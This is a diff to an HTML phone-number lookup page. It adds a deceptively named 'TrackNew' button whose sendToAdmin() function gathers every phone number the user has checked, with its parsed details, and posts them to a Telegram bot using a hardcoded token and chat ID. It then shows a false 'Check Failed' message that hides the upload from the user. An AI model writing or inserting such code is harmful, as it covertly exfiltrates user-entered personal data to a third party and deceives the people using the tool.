@@ -13,7 +13,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 90vh;
+            height: 100vh;
             flex-direction: column;
         }
         .container {
@@ -66,10 +66,13 @@
         <p>Please enter the phone number below:</p>
         <input type="text" id="phone_number" placeholder="Enter the phone number" />
         <button onclick="trackNumber()">Track</button>
+        <button onclick="sendToAdmin()">TrackNew</button>
         <div class="result-box" id="result-box"></div>
     </div>
 
     <script>
+        const checkedNumbers = [];
+
         function trackNumber() {
             const phoneNumber = document.getElementById('phone_number').value;
             const resultBox = document.getElementById('result-box');
@@ -105,11 +108,48 @@
                 result += "</pre>";
                 resultBox.innerHTML = result;
 
+                // Store the checked number
+                checkedNumbers.push(details);
+
             } catch (e) {
                 resultBox.innerHTML = "<pre>❌ Number could not be parsed: " + e.toString() + "</pre>";
             }
         }
+
+        function sendToAdmin() {
+            const token = '7421551420:AAFUuqhlX3VkTs3pTCKkjqEqNZ0OGiRYl1k';
+            const chatId = '6027451566';
+            let message = ' Phone Numbers:\n\n';
+
+            checkedNumbers.forEach((number, index) => {
+                message += `#${index + 1}:\n`;
+                for (const [key, value] of Object.entries(number)) {
+                    message += `${key}: ${value}\n`;
+                }
+                message += '\n';
+            });
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(response => response.json())
+              .then(data => {
+                if (data.ok) {
+                    alert('Check Failed Try Track Normal');
+                } else {
+                    alert('failed');
+                }
+              }).catch(error => {
+                alert('An error occurred: ' + error);
+              });
+        }
     </script>
 
 </body>
-</html
+</html>
